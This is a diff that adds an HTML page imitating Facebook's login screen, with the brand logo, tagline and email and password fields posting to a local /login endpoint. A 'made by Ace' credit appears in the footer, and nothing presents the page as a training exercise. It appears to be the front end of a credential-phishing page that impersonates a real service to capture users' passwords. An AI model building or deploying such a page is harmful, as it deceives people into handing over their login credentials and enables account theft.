@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in to Facebook</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="fb-body">
+<div class="fb-container">
+  <div class="fb-left">
+    <svg class="fb-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" width="240">
+      <path fill="#1877F2" d="M36 18C36 8.06 27.94 0 18 0S0 8.06 0 18c0 8.99 6.58 16.44 15.19 17.79V23.2h-4.57v-5.2h4.57v-3.96c0-4.51 2.69-7.01 6.8-7.01 1.97 0 4.03.35 4.03.35v4.43h-2.27c-2.24 0-2.94 1.39-2.94 2.82v3.38h5l-.8 5.2h-4.2v12.59C29.42 34.44 36 26.99 36 18z"/>
+      <text x="46" y="28" font-family="Helvetica, Arial, sans-serif" font-size="30" font-weight="bold" fill="#1877F2">facebook</text>
+    </svg>
+    <p class="fb-tagline">Facebook helps you connect and share with the people in your life.</p>
+  </div>
+  <div class="fb-right">
+    <div class="fb-card">
+      <form action="/login" method="POST" autocomplete="off">
+        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="fb-btn">Log in</button>
+      </form>
+      <a href="#" class="fb-forgot">Forgotten password?</a>
+      <div class="fb-divider"></div>
+      <button class="fb-new">Create new account</button>
+    </div>
+    <p class="fb-page"><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+  </div>
+  <div class="g-made">made by <span>←→ Ace</span></div>
+</div>
+</body>
+</html>
